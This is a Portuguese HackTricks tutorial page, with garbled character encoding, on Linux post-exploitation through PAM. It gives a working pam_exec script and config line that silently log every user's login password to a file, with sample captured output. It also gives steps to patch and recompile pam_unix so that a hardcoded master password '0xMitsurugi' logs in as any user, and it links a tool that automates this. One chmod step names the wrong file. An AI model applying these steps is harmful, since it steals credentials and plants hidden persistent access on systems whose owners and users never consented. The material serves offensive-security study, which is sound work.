# P√≥s-Explora√ß√£o no Linux

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Capturando Senhas de Login com PAM

Vamos configurar um m√≥dulo PAM para registrar cada senha que cada usu√°rio utiliza para fazer login. Se voc√™ n√£o sabe o que √© PAM, confira:

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

Primeiro, criamos um script bash que ser√° invocado sempre que uma nova autentica√ß√£o ocorrer.
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
```
As vari√°veis s√£o espec√≠ficas do PAM e estar√£o dispon√≠veis por meio do m√≥dulo `pam_exec.so`.

Aqui est√° o significado das vari√°veis:

* **$PAM\_USER:** O nome de usu√°rio que foi inserido.
* **$PAM\_RHOST:** O host remoto (tipicamente o Endere√ßo IP)
* **$(cat -):** Isso l√™ `stdin`, e conter√° a senha que o script captura
* Os resultados s√£o direcionados para um arquivo de log em `/var/log/toomanysecrets.log`

Para **impedir que todos os usu√°rios leiam** o arquivo, considere pr√©-cri√°-lo e executar `chmod`, por exemplo:
```bash
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
```
Em seguida, o arquivo de configura√ß√£o do PAM precisa ser atualizado, o m√≥dulo `pam_exec` ser√° usado para invocar o script.

Existem v√°rios arquivos de configura√ß√£o localizados em `/etc/pam.d/`, e escolhemos `common-auth`.
```
sudo nano /etc/pam.d/common-auth
```
Na parte inferior do arquivo, adicione o seguinte m√≥dulo de autentica√ß√£o:

`auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh`

As op√ß√µes t√™m o seguinte significado:

- **optional:** A autentica√ß√£o n√£o deve falhar se houver um erro (n√£o √© uma etapa obrigat√≥ria)
- **pam\_exec.so:** Este √© o m√≥dulo PAM de living off the land que pode invocar scripts arbitr√°rios
- **expose\_authtok:** Este √© o truque que permite ler a senha via `stdin`
- **quiet:** N√£o mostrar erros ao usu√°rio (se algo n√£o funcionar)
- O √∫ltimo argumento √© o script shell que foi criado anteriormente

![](<../../.gitbook/assets/image (375).png>)

Por fim, torne o arquivo execut√°vel:

`sudo chmod 700 /usr/local/bin/toomanysecrets.sh`

Agora, vamos testar isso e fazer ssh de outra m√°quina, ou fazer login localmente.

E ent√£o, verifique o arquivo de log:
```
$ sudo cat /var/log/toomanysecrets.log
Sun Jun 26 23:36:37 PDT 2022 tom, Trustno1!, From: 192.168.1.149
Sun Jun 26 23:37:53 PDT 2022 tom, Trustno1!, From:
Sun Jun 26 23:39:12 PDT 2022 tom, Trustno1!, From: 192.168.1.149
```
### Instalando Backdoor no PAM

Vamos para as fontes do PAM (depende da sua distribui√ß√£o, pegue o mesmo n√∫mero de vers√£o que a sua...) e procure em torno das linhas 170/180 no arquivo pam\_unix\_auth.c:
```
vi modules/pam_unix/pam_unix_auth.c
```
![](<../../.gitbook/assets/image (651).png>)

Vamos alterar isso para:

![](<../../.gitbook/assets/image (638) (2) (2).png>)

Isso permitir√° que qualquer usu√°rio que use a **senha "0xMitsurugi"** fa√ßa login.

Recompile o `pam_unix_auth.c` e substitua o arquivo pam\_unix.so:
```bash
make
sudo cp \
/home/mitsurugi/PAM/pam_deb/pam-1.1.8/modules/pam_unix/.libs/pam_unix.so \
/lib/x86_64-linux-gnu/security/
```
{% hint style="info" %}
Voc√™ pode automatizar esse processo com [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)
{% endhint %}

## Refer√™ncias

* [https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)
* [https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
